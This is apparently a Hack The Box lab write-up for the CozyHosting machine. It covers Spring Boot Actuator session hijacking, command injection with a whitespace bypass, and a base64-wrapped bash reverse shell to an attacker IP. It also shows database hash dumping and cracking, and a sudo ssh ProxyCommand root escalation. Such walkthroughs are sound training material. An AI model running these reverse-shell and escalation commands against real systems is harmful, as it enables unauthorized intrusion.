---
layout: single
title: CozyHosting - Hack The Box
excerpt: "CozyHosting is an easy-difficulty Linux machine that features a `Spring Boot` application. The application has the `Actuator` endpoint enabled. Enumerating the endpoint leads to the discovery of a user&amp;#039;s session cookie, leading to authenticated access to the main dashboard. The application is vulnerable to command injection, which is leveraged to gain a reverse shell on the remote machine. Enumerating the application&amp;#039;s `JAR` file, hardcoded credentials are discovered and used to log into the local database. The database contains a hashed password, which once cracked is used to log into the machine as the user `josh`. The user is allowed to run `ssh` as `root`, which is leveraged to fully escalate privileges."
date: 2025-05-12
classes: wide
header:
  teaser: /img2/cozyhosting.PNG
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - Cookie Hijacking
  - Command Injection + Filter Bypass
  - JAR archive inspection with JD-GUI + Information Leakage
  - PostgreSQL Database Enumeration
  - Cracking Hashes
  - Abusing Sudoers Privilege (ssh) [Privilege Escalation]
---


## Reconnaissance

- Nmap

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.11.230
```

![](/img2/Pasted%20image%2020250512101440.png)

- Add domain to local DNS

```bash
echo "10.10.11.230 cozyhosting.htb" >> /etc/hosts
```

- Whatweb

```bash
whatweb http://cozyhosting.htb
```

![](/img2/Pasted%20image%2020250512101928.png)

- Dirsearch 

```bash
dirsearch -u http://cozyhosting.htb
```

![](/img2/Pasted%20image%2020250512110733.png)

## Exploitation

- Cookie Hijaking 

![](/img2/Pasted%20image%2020250512110918.png)

![](/img2/Pasted%20image%2020250512111041.png)

- RCE

![](/img2/Pasted%20image%2020250512113314.png)

![](/img2/Pasted%20image%2020250512113358.png)

> We can see the output command in the error

![](/img2/Pasted%20image%2020250512113618.png)

```bash
tcpdump -i tun0 icmp
```

![](/img2/Pasted%20image%2020250512113743.png)

> We can bypass whitespaces with IFS variable

- Send reverse shell

```bash
echo "bash -c 'bash -i >& /dev/tcp/10.10.16.2/9000 0>&1'" | base64
```

![](/img2/Pasted%20image%2020250512115021.png)

## Post-exploitation

- Inspect .jar file

```bash
python3 -m http.server 8000
```

```bash
curl -o cozy.jar http://10.10.11.230:8000/cloudhosting-0.0.1.jar
```

- Connect to Postgresql Database

```bash
jd-gui
```

![](/img2/Pasted%20image%2020250512120446.png)

```bash
psql -h localhost -U postgres -d cozyhosting
```

```sql
select * from users;
```

![](/img2/Pasted%20image%2020250512121534.png)

```
$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6e
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
```

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

![](/img2/Pasted%20image%2020250512121722.png)

- Pivoting

```bash
su josh
```

- Sudoers

```bash
sudo -l
```

![](/img2/Pasted%20image%2020250512122137.png)

```bash
sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x
```

![](/img2/Pasted%20image%2020250512122042.png)